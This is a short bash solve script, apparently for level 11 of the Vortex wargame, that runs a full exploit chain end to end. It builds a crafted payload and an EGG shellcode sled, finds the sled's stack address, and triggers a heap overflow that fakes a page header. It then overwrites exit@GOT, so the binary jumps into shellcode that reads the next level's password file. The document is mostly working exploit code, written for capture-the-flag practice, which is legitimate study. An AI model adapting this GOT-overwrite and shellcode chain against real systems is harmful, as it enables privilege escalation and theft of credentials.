#!/bin/bash
# solve11.sh — run the full L11 chain end to end (as vortex11 on the lab).
# 1. build the craft payload and the EGG sled (build11.py, typed in vim
#    during the recording)
# 2. pin the EGG stack address with h11 (same argv/env shape as the level)
# 3. fire the level with the crafted argv[1] (heap overflow -> fake page
#    header) and argv[2] (strncpy writes 15 bytes over exit@GOT)
# 4. exit(0) jumps into the EGG sled; the 73-byte int 0x80 shellcode
#    reads /etc/vortex_pass/vortex12 (euid = vortex12, no setreuid needed)
set -e
cd "$(dirname "$0")"
python3 build11.py
gcc -m32 -o h11 h11.c
export EGG="$(cat egg.bin)"
EA=$(./h11 "$(cat craft.bin)" "BBBBBBBBBBBBBBB")
echo "EGG at $EA"
TGT=$(( EA + 1024 ))
L=$((TGT & 255)); B1=$(((TGT>>8)&255)); B2=$(((TGT>>16)&255)); B3=$(((TGT>>24)&255))
if [ "$L" -eq 0 ]; then TGT=$((TGT+1)); L=$((TGT & 255)); fi
HX=$(printf '%02x%02x%02x%02x' $L $B1 $B2 $B3)
A2="$(printf "\\x${HX:0:2}\\x${HX:2:2}\\x${HX:4:2}\\x${HX:6:2}BBBBBBBBBBB")"
echo "TGT=$TGT HX=$HX"
A1="$(cat craft.bin)"
/vortex/vortex11 "$A1" "$A2"
echo "RC=$?"
